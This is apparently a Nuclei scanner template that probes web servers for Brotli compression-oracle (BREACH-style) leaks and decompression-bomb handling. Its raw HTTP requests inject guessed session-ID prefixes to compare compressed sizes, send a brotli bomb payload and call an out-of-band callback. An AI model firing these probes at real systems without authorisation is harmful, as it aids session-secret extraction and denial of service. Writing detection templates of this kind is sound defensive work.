http:
- extractors:
  - group: 1
    internal: true
    name: compressed_size
    part: header
    regex:
    - content-length:\s*(\d+)
    type: regex
  headers:
    Accept-Encoding: br, gzip, deflate
    User-Agent: BrotliOracle/1.0
    X-Compression-Test: oracle-{{oracle_id}}
  matchers:
  - dsl:
    - 'contains(body, "oracle-{{oracle_id}}") && contains(tolower(header), "content-encoding:
      br")'
    type: dsl
  - dsl:
    - 'len(body) > 100 && contains(tolower(header), "content-encoding: br") && contains(body,
      "{{BaseURL}}")'
    type: dsl
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/'
  - '{{BaseURL}}/api/'
  - '{{BaseURL}}/compress'
  - '{{BaseURL}}/content'
  - '{{BaseURL}}/data'
- matchers:
  - dsl:
    - (len(body_1) - len(body_2) > 10 || len(body_2) - len(body_1) > 10) && contains(tolower(header_1),
      "br")
    type: dsl
  raw:
  - 'POST {{BaseURL}}/search?q=sessionid%3D{{oracle_id}} HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: br, gzip, deflate

    Content-Type: application/x-www-form-urlencoded

    Cookie: sessionid={{oracle_id}}AAAAAAAAAAAAAA

    Connection: close


    search=sessionid%3D{{oracle_id}}AAAAAAAAAAAAA&submit=1

    '
  - 'POST {{BaseURL}}/search?q=sessionid%3DXXXXXXXXXXXX HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: br, gzip, deflate

    Content-Type: application/x-www-form-urlencoded

    Cookie: sessionid={{oracle_id}}AAAAAAAAAAAAAA

    Connection: close


    search=sessionid%3DXXXXXXXXXXXX&submit=1

    '
- body: '{{brotli_bomb}}'
  headers:
    Content-Encoding: br
    Content-Type: application/octet-stream
    X-Decompression-Test: bomb-{{oracle_id}}
  matchers:
  - condition: and
    dsl:
    - duration >= 10000
    type: dsl
  - case-insensitive: true
    condition: or
    part: body
    type: word
    words:
    - out of memory
    - decompression failed
    - buffer overflow
    - maximum size exceeded
  - condition: or
    status:
    - 413
    - 507
    - 500
    type: status
  matchers-condition: or
  method: PUT
  path:
  - '{{BaseURL}}/api/data'
  - '{{BaseURL}}/upload'
- body: "{\n  \"data1\": \"secret123{{compression_payload}}\",\n  \"data2\": \"public456{{compression_payload}}\"\
    ,\n  \"compression\": \"brotli\",\n  \"analyze_ratio\": true,\n  \"webhook\":\
    \ \"{{callback_url}}/ratio-{{oracle_id}}\"\n}\n"
  extractors:
  - json:
    - .compression_ratio
    - .size_difference
    - .entropy_analysis
    type: json
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  method: POST
  path:
  - '{{BaseURL}}/api/compare'
  - '{{BaseURL}}/compress/analyze'
id: brotli-compression-oracle-attack
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:L
    cvss-score: 4.0
    cwe-id: CWE-409,CWE-208,CWE-400
  description: 'Detects ACTUAL compression oracle vulnerabilities by injecting controlled

    data and measuring compression ratio differences. Tests BREACH-style attacks

    where user input is compressed with secrets, allowing secret extraction

    through compression ratio analysis.

    '
  name: Brotli Compression Oracle Attack Detection
  reference:
  - https://tools.ietf.org/html/rfc7932
  - https://github.com/google/brotli
  - https://www.blackhat.com/docs/us-16/materials/us-16-Gilboa-BREACH-SSL-Gone-In-30-Seconds.pdf
  - https://blog.cloudflare.com/results-experimenting-brotli/
  severity: high
  tags: brotli,compression,oracle,timing,decompression-bomb,information-disclosure
variables:
  brotli_bomb: 91 08 80 63 65 6c 65 72 79 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00 00
  callback_url: '{{interactsh-url}}'
  compression_payload: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  oracle_id: '{{randstr}}'
